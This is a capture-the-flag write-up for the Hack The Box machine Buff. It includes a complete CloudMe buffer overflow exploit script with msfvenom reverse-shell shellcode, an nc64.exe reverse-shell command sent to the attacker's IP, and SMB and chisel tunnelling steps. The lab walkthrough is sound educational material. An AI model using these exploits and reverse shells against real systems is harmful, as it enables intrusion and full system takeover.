![image](https://user-images.githubusercontent.com/105310322/196471216-474e621b-00c3-4a90-8d50-55ead69fd885.png)


### Tools: Feroxbuster, exploit.db, msfvenom

### Vulnerabilities: Gym Management Service, Buffer Overflow: CloudMe.exe

Nmap shows 1 port open on port 8080 which is a webpage we can visit.

```
└─$ nmap -A -p- -T4 -Pn 10.129.2.18
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-17 15:56 CDT
Nmap scan report for Buff.htb (10.129.2.18)
Host is up (0.14s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 505.48 seconds
```
A quick feroxbuster shows that their is an upload page and a logout page. Which means there is somewhere to login too.

```console
└─$ feroxbuster -u http://Buff.htb:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q
301      GET        9l       30w      337c http://buff.htb:8080/include => http://buff.htb:8080/include/
301      GET        9l       30w      333c http://buff.htb:8080/img => http://buff.htb:8080/img/
200      GET      133l      308w     4969c http://buff.htb:8080/
302      GET        0l        0w        0c http://buff.htb:8080/include/logout.php => ../index.php
403      GET       42l       97w        0c http://buff.htb:8080/.html
200      GET        4l       20w      137c http://buff.htb:8080/register.php
301      GET        9l       30w      336c http://buff.htb:8080/upload => http://buff.htb:8080/upload/
200      GET      118l      265w     4169c http://buff.htb:8080/contact.php
200      GET        2l       12w      107c http://buff.htb:8080/upload.php
200      GET        2l       18w      143c http://buff.htb:8080/home.php
200      GET      141l      433w     5337c http://buff.htb:8080/about.php
403      GET       42l       97w        0c http://buff.htb:8080/webalizer
301      GET        9l       30w      337c http://buff.htb:8080/profile => http://buff.htb:8080/profile/
200      GET      133l      308w     4969c http://buff.htb:8080/index.php
403      GET       45l      113w        0c http://buff.htb:8080/phpmyadmin
301      GET        9l       30w      344c http://buff.htb:8080/profile/upload => http://buff.htb:8080/profile/upload/
200      GET        0l        0w        0c http://buff.htb:8080/include/functions.php
200      GET      121l      278w     4282c http://buff.htb:8080/edit.php
200      GET        2l       14w      132c http://buff.htb:8080/profile/index.php
200      GET      113l      268w     4252c http://buff.htb:8080/feedback.php
200      GET      168l      486w     7791c http://buff.htb:8080/packages.php
```
![image](https://user-images.githubusercontent.com/105310322/196527333-07a9eab7-2381-490c-b6cb-42b190c322a2.png)


After checking out the website just a bit we can see that it is running Gym Management Service 1.0. A quick google search gives us an exploit we can run.

https://www.exploit-db.com/exploits/48506

![image](https://user-images.githubusercontent.com/105310322/196527449-f3c3b91b-3d9a-49b0-8dee-2c2e7568186b.png)



After running the exploit we quickly gain access to the shaun user and nab the first flag.

```console
C:\xampp\htdocs\gym\upload> whoami
�PNG
�
buff\shaun
```
```console
C:\xampp\htdocs\gym\upload> type c:\users\shaun\Desktop\user.txt
�PNG
�
306d****************************
********************************
```

Since this shell sucks I went back and created a reverse shell.

Set up your smbshare.

```console
└─$ sudo impacket-smbserver rogue . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Then I ran the exploit again and executed my reverse shell without copying any files.

Note: This is a pretty cool trick I learned and makes things a little faster and easier if you are running into issues with getting files on the victim.

```console
└─$ python2.7 48506.py http://buff.htb:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> \\10.10.16.16\rogue\nc64.exe -e cmd.exe 10.10.16.16 1234
```

By checking through Shaun's files we see an interesting binary.

```console
PS C:\Users\shaun\Downloads> ls
ls


    Directory: C:\Users\shaun\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe  
```

Again I am going to run winpeas without transferring it to the victim.

On host

```console
└─$ sudo impacket-smbserver rogue . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
```

On victim

```console
PS C:\users\shaun\Downloads> \\10.10.16.16\rogue\winPEASx64.exe
```
Linpeas shows the running processes and also tells us that the CloudMe service is being ran on localhost port 8888

```console
����������͹ Current TCP Listening Ports
� Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                               
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         952             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         5816            svchost
  TCP        0.0.0.0               7680          0.0.0.0               0               Listening         1072            svchost
  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         8596            C:\xampp\apache\bin\httpd.exe
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         516             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1044            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1580            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         2252            spoolsv
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         668             services
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         688             lsass
  TCP        10.129.2.18           139           0.0.0.0               0               Listening         4               System
  TCP        10.129.2.18           8080          10.10.16.16           42504           Close Wait        8596            C:\xampp\apache\bin\httpd.exe
  TCP        10.129.2.18           8080          10.10.16.16           55280           Established       8596            C:\xampp\apache\bin\httpd.exe
  TCP        10.129.2.18           49847         10.10.16.16           445             Established       4               System
  TCP        10.129.2.18           49848         10.10.16.16           1235            Established       6832            \\10.10.16.16\rogue\nc64.exe
  TCP        127.0.0.1             3306          0.0.0.0               0               Listening         8628            C:\xampp\mysql\bin\mysqld.exe
  TCP        127.0.0.1             8888          0.0.0.0               0               Listening         4280            CloudMe
```
This PoC should do the job pretty quickly but we will need to modify the script a little to actually exploit it.

Note: With how old this machine is I am pretty sure this part should be harder with crafting and finding the Buffer Overflow yourself but luckily someone has made a PoC for us.

https://www.exploit-db.com/exploits/48389

1st we are going to transfer chisel to the victim machine so we can access here localhost on our host machine.

```console
└─$ sudo impacket-smbserver rogue . -smb2support
[sudo] password for npayne: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
```console
c:\Users\Public>copy \\10.10.16.16\rogue\chiselwin.exe chiselwin.exe
copy \\10.10.16.16\rogue\chiselwin.exe chiselwin.exe
        1 file(s) copied.
```

Next set up chisel listener on your host.

```console
└─$ chisel server --reverse --port 1234
2022/10/18 14:18:24 server: Reverse tunnelling enabled
2022/10/18 14:18:24 server: Fingerprint RZQ9LOlLjBYeVcnA6fq7Fi90YADFsXsI+giE5JxJZp8=
2022/10/18 14:18:24 server: Listening on http://0.0.0.0:1234
2022/10/18 14:18:49 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2022/10/18 14:18:49 server: session#1: tun: proxy#R:8888=>8888: Listening
```
Then run chisel on the victim to connect.

```console
c:\Users\Public>chiselwin.exe client 10.10.16.16:1234 R:8888:127.0.0.1:8888
chiselwin.exe client 10.10.16.16:1234 R:8888:127.0.0.1:8888
2022/10/18 20:18:48 client: Connecting to ws://10.10.16.16:1234
2022/10/18 20:18:48 client: Connected (Latency 31.6057ms)
```

The last big thing to do is add some custom shellcode to exploit to create a reverse shell and gain root.

Note: Originally when I did this it was not working but a system reset fixed it and my exploit ran flawlessly.

```
└─$ msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.16 LPORT=5555 -b '\x00\x0A\x0D' -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload =  b""
payload += b"\xbe\x9a\x84\xd2\x91\xdb\xdb\xd9\x74\x24\xf4"
payload += b"\x5f\x29\xc9\xb1\x52\x31\x77\x12\x03\x77\x12"
payload += b"\x83\x5d\x80\x30\x64\x9d\x61\x36\x87\x5d\x72"
payload += b"\x57\x01\xb8\x43\x57\x75\xc9\xf4\x67\xfd\x9f"
payload += b"\xf8\x0c\x53\x0b\x8a\x61\x7c\x3c\x3b\xcf\x5a"
payload += b"\x73\xbc\x7c\x9e\x12\x3e\x7f\xf3\xf4\x7f\xb0"
payload += b"\x06\xf5\xb8\xad\xeb\xa7\x11\xb9\x5e\x57\x15"
payload += b"\xf7\x62\xdc\x65\x19\xe3\x01\x3d\x18\xc2\x94"
payload += b"\x35\x43\xc4\x17\x99\xff\x4d\x0f\xfe\x3a\x07"
payload += b"\xa4\x34\xb0\x96\x6c\x05\x39\x34\x51\xa9\xc8"
payload += b"\x44\x96\x0e\x33\x33\xee\x6c\xce\x44\x35\x0e"
payload += b"\x14\xc0\xad\xa8\xdf\x72\x09\x48\x33\xe4\xda"
payload += b"\x46\xf8\x62\x84\x4a\xff\xa7\xbf\x77\x74\x46"
payload += b"\x6f\xfe\xce\x6d\xab\x5a\x94\x0c\xea\x06\x7b"
payload += b"\x30\xec\xe8\x24\x94\x67\x04\x30\xa5\x2a\x41"
payload += b"\xf5\x84\xd4\x91\x91\x9f\xa7\xa3\x3e\x34\x2f"
payload += b"\x88\xb7\x92\xa8\xef\xed\x63\x26\x0e\x0e\x94"
payload += b"\x6f\xd5\x5a\xc4\x07\xfc\xe2\x8f\xd7\x01\x37"
payload += b"\x1f\x87\xad\xe8\xe0\x77\x0e\x59\x89\x9d\x81"
payload += b"\x86\xa9\x9e\x4b\xaf\x40\x65\x1c\xda\x9e\x75"
payload += b"\xcc\xb2\x9c\x75\xf9\xf1\x28\x93\x6b\xe6\x7c"
payload += b"\x0c\x04\x9f\x24\xc6\xb5\x60\xf3\xa3\xf6\xeb"
payload += b"\xf0\x54\xb8\x1b\x7c\x46\x2d\xec\xcb\x34\xf8"
payload += b"\xf3\xe1\x50\x66\x61\x6e\xa0\xe1\x9a\x39\xf7"
payload += b"\xa6\x6d\x30\x9d\x5a\xd7\xea\x83\xa6\x81\xd5"
payload += b"\x07\x7d\x72\xdb\x86\xf0\xce\xff\x98\xcc\xcf"
payload += b"\xbb\xcc\x80\x99\x15\xba\x66\x70\xd4\x14\x31"
payload += b"\x2f\xbe\xf0\xc4\x03\x01\x86\xc8\x49\xf7\x66"
payload += b"\x78\x24\x4e\x99\xb5\xa0\x46\xe2\xab\x50\xa8"
payload += b"\x39\x68\x60\xe3\x63\xd9\xe9\xaa\xf6\x5b\x74"
payload += b"\x4d\x2d\x9f\x81\xce\xc7\x60\x76\xce\xa2\x65"
payload += b"\x32\x48\x5f\x14\x2b\x3d\x5f\x8b\x4c\x14"
```
The final script should look something like this

```python
import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xbe\x9a\x84\xd2\x91\xdb\xdb\xd9\x74\x24\xf4"
payload += b"\x5f\x29\xc9\xb1\x52\x31\x77\x12\x03\x77\x12"
payload += b"\x83\x5d\x80\x30\x64\x9d\x61\x36\x87\x5d\x72"
payload += b"\x57\x01\xb8\x43\x57\x75\xc9\xf4\x67\xfd\x9f"
payload += b"\xf8\x0c\x53\x0b\x8a\x61\x7c\x3c\x3b\xcf\x5a"
payload += b"\x73\xbc\x7c\x9e\x12\x3e\x7f\xf3\xf4\x7f\xb0"
payload += b"\x06\xf5\xb8\xad\xeb\xa7\x11\xb9\x5e\x57\x15"
payload += b"\xf7\x62\xdc\x65\x19\xe3\x01\x3d\x18\xc2\x94"
payload += b"\x35\x43\xc4\x17\x99\xff\x4d\x0f\xfe\x3a\x07"
payload += b"\xa4\x34\xb0\x96\x6c\x05\x39\x34\x51\xa9\xc8"
payload += b"\x44\x96\x0e\x33\x33\xee\x6c\xce\x44\x35\x0e"
payload += b"\x14\xc0\xad\xa8\xdf\x72\x09\x48\x33\xe4\xda"
payload += b"\x46\xf8\x62\x84\x4a\xff\xa7\xbf\x77\x74\x46"
payload += b"\x6f\xfe\xce\x6d\xab\x5a\x94\x0c\xea\x06\x7b"
payload += b"\x30\xec\xe8\x24\x94\x67\x04\x30\xa5\x2a\x41"
payload += b"\xf5\x84\xd4\x91\x91\x9f\xa7\xa3\x3e\x34\x2f"
payload += b"\x88\xb7\x92\xa8\xef\xed\x63\x26\x0e\x0e\x94"
payload += b"\x6f\xd5\x5a\xc4\x07\xfc\xe2\x8f\xd7\x01\x37"
payload += b"\x1f\x87\xad\xe8\xe0\x77\x0e\x59\x89\x9d\x81"
payload += b"\x86\xa9\x9e\x4b\xaf\x40\x65\x1c\xda\x9e\x75"
payload += b"\xcc\xb2\x9c\x75\xf9\xf1\x28\x93\x6b\xe6\x7c"
payload += b"\x0c\x04\x9f\x24\xc6\xb5\x60\xf3\xa3\xf6\xeb"
payload += b"\xf0\x54\xb8\x1b\x7c\x46\x2d\xec\xcb\x34\xf8"
payload += b"\xf3\xe1\x50\x66\x61\x6e\xa0\xe1\x9a\x39\xf7"
payload += b"\xa6\x6d\x30\x9d\x5a\xd7\xea\x83\xa6\x81\xd5"
payload += b"\x07\x7d\x72\xdb\x86\xf0\xce\xff\x98\xcc\xcf"
payload += b"\xbb\xcc\x80\x99\x15\xba\x66\x70\xd4\x14\x31"
payload += b"\x2f\xbe\xf0\xc4\x03\x01\x86\xc8\x49\xf7\x66"
payload += b"\x78\x24\x4e\x99\xb5\xa0\x46\xe2\xab\x50\xa8"
payload += b"\x39\x68\x60\xe3\x63\xd9\xe9\xaa\xf6\x5b\x74"
payload += b"\x4d\x2d\x9f\x81\xce\xc7\x60\x76\xce\xa2\x65"
payload += b"\x32\x48\x5f\x14\x2b\x3d\x5f\x8b\x4c\x14"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
```
Finally set up your listener and run your script

```console
└─$ python3 buff.py
```
Hopefully everything went well and you become root!

```console
└─$ nc -lvnp 5555
listening on [any] 443 ...
connect to [10.10.16.16] from (UNKNOWN) [10.129.7.44] 49680
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
buff\administrator
```
```console
C:\users\administrator\Desktop> type root.txt
type root.txt
c2a8****************************
```
GG!
